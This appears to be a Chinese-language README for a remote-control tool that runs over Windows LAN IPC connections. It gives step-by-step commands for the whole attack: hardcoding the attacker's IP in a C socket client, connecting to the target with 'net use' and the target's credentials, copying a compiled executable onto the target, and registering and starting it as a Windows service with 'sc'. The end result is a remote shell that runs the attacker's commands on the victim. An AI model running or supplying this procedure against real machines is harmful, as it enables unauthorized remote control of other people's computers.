# 一个利用局域网IPC连接的远控工具
## 使用:
- 首先我们需要知道我们在局域网的**IP**。在我们的cmd.exe中用 **<code>ipconfig</code>** 这个命令来获取我们的IP
- 接着，在代码中配置你的 **IP** : <code>
struct sockaddr_in serverAddr;
serverAddr.sin_family = AF_INET;
serverAddr.sin_addr.s_addr = inet_addr **("192.168.123.7")**; //在这里修改成你的ip
serverAddr.sin_port = htons(8888);</code>


- 随后，用 **<code>net use \\IP\ipc$ "password" /user:"目标电脑用户"</code>** 命令与你的目标电脑进行远程IPC连接。 [了解更多](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/gg651155(v=ws.11))
- 接下来用 **<code>dir \\IP\c$</code>** 命令确保你有足够的权限在目标电脑上创建Windwos服务。如果有权限，在 **run.c**代码中像第二步那样配置你的ip.下一步，我们用 **<code>g++ -o run.exe run.c -lws2_32 -static</code>** 编译成一个.exe可执行文件.


- 有了可执行文件后，用 **<code>copy run.exe \\IP\\PATH</code>** 将这个exe复制到目标电脑。随后使用 **<code>sc //IP create SERVICENAME binpath= "PATH"</code>** 在目标电脑上创建服务。如果没有问题，先启动 **socket_server.c** ，然后输出指令 **<code>sc \\IP start SERVICENAME</code>** 在目标电脑上启动这个服务
- 最后，如果 **socket_c** 显示 **>>** 并且可以输入, 输入的cmd指令将会在目标电脑上运行。
